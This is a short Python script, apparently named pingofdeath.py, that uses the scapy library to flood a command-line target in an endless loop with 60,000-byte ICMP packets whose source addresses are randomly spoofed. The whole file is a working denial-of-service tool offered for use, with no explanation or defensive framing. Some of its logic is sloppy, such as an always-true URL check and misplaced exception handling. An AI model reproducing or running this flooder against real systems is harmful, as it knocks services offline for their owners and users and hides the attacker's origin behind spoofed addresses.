#!/usr/bin/env python
#author Aiden

from scapy.all import *
import random  ,re ,sys 

if len(sys.argv) != 2:
	print "Usage: pingofdeath.py <target>"
	sys.exit(1) 
victim = sys.argv[1]

class pingofdeath:
	try:
		def check(self):
			global target,victim
			rep = victim.replace('.','')
			check = rep.isdigit()
			if check == True:
				target = victim 
			elif check == False and 'http'or'https' in victim:
				if victim.count("/")==2:
					victim = victim + "/"
				m = re.search('(https?\://)?([^/]*)/?.*', victim)
				host = m.group(2)
				target = socket.gethostbyname(host)

		def run(self):
			self.check()
			i = IP()
			i.src = "%i.%i.%i.%i" % (random.randint(1,254),random.randint(1,254),random.randint(1,254),random.randint(1,254))	
			randomip = i.src
			ip_header = IP(src=i.src ,dst=target)

			packet = ip_header/ICMP()/("m"*60000)
			send(packet)

			print "{0} ---ICMP---> {1}".format(randomip,target)
	except KeyboardInterrupt:
		sys.exit(1)
	except:
		print 'Victim not available!'
		sys.exit(1)
ping = pingofdeath()
while True:
	ping.run()
	
